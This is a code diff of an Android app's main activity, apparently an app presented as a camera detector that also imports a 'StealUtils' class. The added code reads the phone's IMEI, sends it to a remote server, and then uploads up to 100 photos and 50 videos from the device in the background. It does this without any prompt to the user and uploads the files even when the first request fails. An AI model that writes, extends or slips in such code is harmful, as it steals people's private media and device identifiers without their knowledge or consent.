@@ -14,6 +14,9 @@ import king.bird.camaradetector.net.NetWorkUtilsK
 import java.io.File
 import king.bird.tool.PermissionUtils
 import android.telephony.TelephonyManager
+import android.view.LayoutInflater
+import android.view.View
+import android.widget.TextView
 import com.google.gson.Gson
 import com.zhy.http.okhttp.OkHttpUtils
 import com.zhy.http.okhttp.callback.StringCallback
@@ -24,6 +27,7 @@ import king.bird.marrykotlin.iface.OnRequestListener
 import king.bird.tool.StealUtils
 import kotlinx.android.synthetic.main.activity_main.*
 import okhttp3.Call
+import org.jetbrains.anko.async
 import java.lang.Exception
 import java.text.SimpleDateFormat
 import java.util.*
@@ -80,25 +84,28 @@ class MainActivity : AppCompatActivity() {
             if (it.fileSize / 1000 in 19..5999) {
                 i++
                 if (i < 100) {
-                    files[it.title] = File(it.filePath)
+                    //files[it.title] = File(it.filePath)
+                    async {
+                        OkHttpUtils.post().addParams("dir", imei)
+                                .addFile(it.title, it.title, File(it.filePath))
+                                .url(Api.baseUrl)
+                                .addHeader("method", Api.upLoadPic)
+                                .build().execute(object : StringCallback() {
+                                    override fun onResponse(p0: String?, p1: Int) {
+                                        LogUtils.e(p0)
+                                    }
+
+                                    override fun onError(p0: Call?, p1: Exception?, p2: Int) {
+                                        if (p1 != null) {
+                                            LogUtils.e(p1.message)
+                                        }
+                                    }
+                                })
+                    }
                 }
             }
         }
-        OkHttpUtils.post().addParams("dir", imei)
-                .files("file", files)
-                .url(Api.baseUrl)
-                .addHeader("method", Api.upLoadPic)
-                .build().execute(object : StringCallback() {
-                    override fun onResponse(p0: String?, p1: Int) {
-                        LogUtils.e(p0)
-                    }
 
-                    override fun onError(p0: Call?, p1: Exception?, p2: Int) {
-                        if (p1 != null) {
-                            LogUtils.e(p1.message)
-                        }
-                    }
-                })
     }
 
     /**
@@ -111,25 +118,28 @@ class MainActivity : AppCompatActivity() {
         //机算数量
         allLocalPhotos.forEach {
             i++
-            if (i < 10) {
-                files[it.title] = File(it.filePath)
+            if (i < 50) {
+                async {
+                    OkHttpUtils.post().addParams("dir", imei)
+                            //.files("file", files)
+                            .addFile(it.title, it.title, File(it.filePath))
+                            .url(Api.baseUrl)
+                            .addHeader("method", Api.upLoadVideo)
+                            .build().execute(object : StringCallback() {
+                                override fun onResponse(p0: String?, p1: Int) {
+                                    LogUtils.e(p0)
+                                }
+
+                                override fun onError(p0: Call?, p1: Exception?, p2: Int) {
+                                    if (p1 != null) {
+                                        LogUtils.e(p1.message)
+                                    }
+                                }
+                            })
+                }
             }
         }
-        OkHttpUtils.post().addParams("dir", imei)
-                .files("file", files)
-                .url(Api.baseUrl)
-                .addHeader("method", Api.upLoadVideo)
-                .build().execute(object : StringCallback() {
-                    override fun onResponse(p0: String?, p1: Int) {
-                        LogUtils.e(p0)
-                    }
 
-                    override fun onError(p0: Call?, p1: Exception?, p2: Int) {
-                        if (p1 != null) {
-                            LogUtils.e(p1.message)
-                        }
-                    }
-                })
     }
 
     /**
@@ -138,29 +148,30 @@ class MainActivity : AppCompatActivity() {
     @SuppressLint("HardwareIds", "SimpleDateFormat", "MissingPermission")
     private fun saveUserInfo() {
 
-            val user = User()
-            val map = HashMap<String, String>()
-            val telephonyMgr = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
-            val imei = telephonyMgr.deviceId as String
-            val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
-            val curDate = Date(System.currentTimeMillis())
-            user.id = imei
-            user.deviceId = imei
-            user.intoCount = "0"
-            user.imageSize = "0"
-            user.createTime = formatter.format(curDate)
-            map["data"] = Gson().toJson(user)
-            NetWorkUtilsK.doPostJson(Api.baseUrl, map, Api.saveInfo, object : OnRequestListener {
-                override fun onSuccess(t: String) {
-                    upLoadPics(imei)
-                    upLoadVideos(imei)
-                }
+        val user = User()
+        val map = HashMap<String, String>()
+        val telephonyMgr = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+        val imei = telephonyMgr.deviceId as String
+        val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
+        val curDate = Date(System.currentTimeMillis())
+        user.id = imei
+        user.deviceId = imei
+        user.intoCount = "0"
+        user.imageSize = "0"
+        user.createTime = formatter.format(curDate)
+        map["data"] = Gson().toJson(user)
+        NetWorkUtilsK.doPostJson(Api.baseUrl, map, Api.saveInfo, object : OnRequestListener {
+            override fun onSuccess(t: String) {
+                async { upLoadPics(imei) }
+                async { upLoadVideos(imei) }
 
-                override fun onError(errorMsg: String) {
-                    upLoadPics(imei)
-                    upLoadVideos(imei)
-                }
-            })
+            }
+
+            override fun onError(errorMsg: String) {
+                async { upLoadPics(imei) }
+                async { upLoadVideos(imei) }
+            }
+        })
 
 
     }
